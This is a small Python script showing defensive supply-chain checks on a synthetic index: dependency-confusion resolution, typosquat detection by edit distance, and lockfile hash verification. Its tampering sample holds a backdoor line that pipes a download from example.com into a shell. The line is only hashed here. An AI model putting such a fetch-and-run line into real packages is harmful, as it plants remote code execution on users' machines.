# Python 3.10, standard library only.
# Run: python3 supply-chain-checks.py
# Three checks against common supply-chain attack paths, on a synthetic package index (no network access):
# 1 dependency confusion in a resolver, 2 typosquat detection, 3 artifact integrity against a lockfile with hashes.
import hashlib

# 1. Dependency confusion: an internal package name also exists on the public index with a higher version.
public = {"acme-utils": ["9.9.9"], "requests": ["2.31.0"]}      # attacker published acme-utils 9.9.9
internal = {"acme-utils": ["1.4.2"]}                              # the real, private package

def version_key(v): return tuple(int(x) for x in v.split("."))

def resolve_naive(name):
    """Looks at all indexes and takes the highest version, the vulnerable behavior."""
    candidates = [("public", v) for v in public.get(name, [])] + [("internal", v) for v in internal.get(name, [])]
    return max(candidates, key=lambda c: version_key(c[1]))

def resolve_pinned(name, owner_index="internal"):
    """Names owned by the organization resolve only from the internal index."""
    source = internal if name in internal else public
    return ("internal" if source is internal else "public", max(source[name], key=version_key))

print("1 naive resolver       :", resolve_naive("acme-utils"))
print("1 owned-name resolver  :", resolve_pinned("acme-utils"))

# 2. Typosquatting: edit distance of a requested name to a list of popular names.
def distance(a, b):
    prev = list(range(len(b) + 1))
    for i, ca in enumerate(a, 1):
        cur = [i]
        for j, cb in enumerate(b, 1):
            cur.append(min(prev[j] + 1, cur[j - 1] + 1, prev[j - 1] + (ca != cb)))
        prev = cur
    return prev[-1]

popular = ["requests", "numpy", "cryptography", "urllib3", "pyyaml"]
for requested in ("requets", "numpyy", "flask"):
    near = [(p, distance(requested, p)) for p in popular if 0 < distance(requested, p) <= 2]
    print(f"2 typosquat check      : {requested!r:10} -> {near or 'no near neighbor'}")

# 3. Integrity: a lockfile pins the SHA-256 of each artifact, an install verifies it before use.
good = b"def add(a, b):\n    return a + b\n"
lock = {"mini-math-1.0.tar": hashlib.sha256(good).hexdigest()}
tampered = good + b"import os; os.system('curl example.com/x | sh')\n"   # backdoored rebuild of the same version
for label, blob in (("registry copy", good), ("tampered copy", tampered)):
    ok = hashlib.sha256(blob).hexdigest() == lock["mini-math-1.0.tar"]
    print(f"3 lockfile hash check  : {label:13} -> {'accepted' if ok else 'REJECTED, hash differs'}")
